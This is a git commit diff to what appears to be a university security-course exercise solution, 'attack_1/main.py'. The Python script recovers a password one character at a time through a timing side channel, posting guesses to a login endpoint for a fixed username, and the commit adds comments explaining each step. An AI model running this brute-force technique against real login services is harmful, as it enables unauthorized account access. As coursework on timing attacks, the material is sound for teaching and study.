5a926c09d61ffa0edc08d939a5f06f64032eb6d9
Thomas Nesje Wiik <thomasnw@uia.no>
2023-12-05 11:23:48 +0100

    Updated code with comments in attack_1

--- solutions/attack_1/main.py
+++ solutions/attack_1/main.py
@@ -1,24 +1,36 @@
 import requests
-def try_password(url, username, password_guess, i):
+
+
+def try_password(password_guess, i):
+    username = 'jonas.dahl'
+    url = 'https://portal.regjeringen.uiaikt.no/login'
     data = {'username': username, 'password': password_guess}
     response = requests.post(url, json=data)
     json = response.json()
+    # Get the total time response from the server
     total_time = json['total_time']
+    # If the total time is greater than i + 1, then the current character is correct
     if total_time > i + 1:
         return True
     else:
         return False
 
 
-def find_password(url, username):
+def find_password():
+    # Password length is known to be based on manual testing 17
     password = 'aaaaaaaaaaaaaaaaa'
-    characters = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\]^`{|}~'
+    characters = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
     final_password = ''
+
+    # i is in this function used to keep track of the index of the character we are trying to guess
     i = 0
     while True:
         for char in characters:
+            # Replace the character at index i with the current character we are trying
             password = password[:i] + char + password[i+1:]
-            if try_password(url, username, password, i):
+            # If try_password returns true, the character is added to the final password,
+            # and we move on to the next character
+            if try_password(password, i):
                 final_password += char
                 print(final_password)
                 break
@@ -26,6 +38,4 @@ def find_password(url, username):
         i += 1
 
 
-url = 'https://portal.regjeringen.uiaikt.no/login'
-username = 'jonas.dahl'
-find_password(url, username)
+find_password()
